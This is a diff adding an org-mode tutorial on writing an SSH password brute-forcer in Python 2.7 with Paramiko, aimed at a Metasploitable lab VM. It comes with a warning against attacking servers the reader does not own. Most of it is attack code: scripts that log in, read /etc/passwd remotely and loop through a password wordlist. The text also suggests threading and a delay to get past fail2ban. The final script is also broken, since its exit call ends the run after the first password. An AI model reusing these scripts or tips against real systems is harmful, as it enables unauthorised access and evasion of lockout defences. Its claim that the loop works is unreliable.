@@ -1,0 +1,105 @@
+#+TITLE: Brute Force SSH with Python and Paramiko
+#+INCLUDE: "../header.org"
+#+AUTHOR: David Johnson
+#+SETUPFILE: "../org-html-themes/org/theme-readtheorg-local-1.setup"
+#+INDEX: Brute Force
+#+INDEX: Linux!SSH!Brute Force
+#+TAG: Linux
+#+TAG: SSH
+#+TAG: Brute Force
+
+* Introduction
+This tutorial will teach you how to write a Python script using Paramiko to bruit force SSH. I will start by showing you how to make a connection, send input and receive output, and finish with brute forcing. In this tutorial I will be attacking Metasploitable and I recommend you do as well. I have a handy tutorial on how to set up Metasploitable if you need any help.
+
+* Prerequisites
+
+- Python 2.7
+
+- Docker
+
+Basic Python skills are required you can copy and past this script, however understanding will get you much farther.
+
+The first prerequisite is of coarse Python, Python 2.7 to be specific. If you are running any Linux or BSD distro you already have Python installed. If you are running Windows you can download Python here.
+
+Paramiko is a Python library that makes working with SSH so simple. To install Paramiko we will be using pip.
+
+#+BEGIN_EXAMPLE bash
+pip install paramiko
+#+END_EXAMPLE
+
+
+Now you just need a SSH server to attack. Pleas do not attack a server you do not own. It is illegal in most parts of the world to access a computer with out the owners permission.
+
+* Step 1
+First, we will start by making a simple SSH connection.
+
+#+BEGIN_EXAMPLE python
+#!/usr/bin/python2.7
+import paramiko                                    #ssh lib
+
+ssh = paramiko.SSHClient()                         #set up ssh client
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  #This will add the host key if you are connecting to a server for the first time
+
+try:                                               # try to make a connection
+    ssh.connect('192.168.56.101', username='msfadmin', password='msfadmin')   
+    ssh.close()                                     # close the connection
+except:                                             # if no connection is made then pass
+    pass
+finally:
+    exit(0)
+#+END_EXAMPLE
+
+Lets brake this down a bit. To begin with I want to run this script without having to call Python. For example I want run this script by entering ./bruitforce_ssh.py into the terminal instead of python bruitforce_ssh.py. This is done with the first line #!/usr/bin/python2.7. To use Paramiko it has to be imported. That is done with the second line import paramiko. We want to connect to a SSH server so we need a SSH client ssh = paramiko.SSHClient(). If you are connecting to a SSH server for the first time you will need to set the host key. That is done with ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()). All that is left is to try to connect and if that fails quit. That is done with the try and except and finally. To connect to a server you need the IP address, username, and password. Observe how I do it here ssh.connect('192.168.56.101', username='msfadmin', password='msfadmin'). The IP address of the Metasploitable VM is 192.168.56.101. We know the username is msfadmin and the password is msfadmin. If this fails to make a connection it will through an exception witch we will just pass at this time. Finally I want to exit the script.
+
+* Step 2
+This next step we add input and receive output. We will reuse the code from above and three lines. Lets take a look.
+
+#+BEGIN_EXAMPLE python
+#!/usr/bin/python2.7
+import paramiko                                    #ssh lib
+
+ssh = paramiko.SSHClient()                         #set up ssh client
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  #This will add the host key if you are connecting to a server for the first time
+
+try:                                               # try to make a connection
+    ssh.connect('192.168.56.101', username='msfadmin', password='msfadmin')   
+    sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd') # execute code
+    for line in stdout.readlines():
+            print line.strip()      # print out the output
+    ssh.close()                                     # close the connection
+except:                                             # if no connection is made then pass
+    pass
+finally:
+    exit(0)
+#+END_EXAMPLE
+Did you notice what was added? Look in the try statement, you will see sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd'). This line of code sill set up standard input, standard output, and standard error, along with executing code. In this case we are concatenating the passwd file. To view this out put a for loop is needed for line in stdout.readlines():. Notice we are looping through the stdout and printing the content with print line.strip().
+
+* Step 3
+This is where the fun part takes place. We need to go through a password list and try each one. Notice I have changed the code a bit, however it is also the same. All I have done is put the try, except, and finally into a function. I also added a for loop to loop through the password list. I would also like to add that I added the password msfadmin to the fasttrack.txt file.
+
+#+BEGIN_EXAMPLE python
+#!/usr/bin/python2.7
+import paramiko                                    #ssh lib
+
+f = open('/usr/share/wordlists/fasttrack.txt', 'r') # open password list
+ssh = paramiko.SSHClient()                         #set up ssh client
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  #This will add the host key if you are connecting to a server for the first time
+
+def attack_ssh(passwd):
+    try:                                               # try to make a connection
+        ssh.connect('192.168.56.101', username='msfadmin', password= passwd)   
+        sdtin, stdout, stderr = ssh.exec_command('cat /etc/passwd') # execute code
+        for line in stdout.readlines():
+            print line.strip()      # print out the output
+        ssh.close()                                     # close the connection
+    except:                                             # if no connection is made then pass
+        pass
+    finally:
+        exit(0)
+for passwd in f:                   # loop through password list 
+    attack_ssh(passwd.rstrip())
+#+END_EXAMPLE
+That's it! This script can and should be modified to your needs. I suggest adding threading to speed up the process. Or you can add a delay to attack a SSH server with fail2ban.
+
+* Summary
+Attacking a SSH server is quite simple when using Paramiko and Python. There is much more that needs to be done to truly make this script work. Visit my github to see how I used this concept.
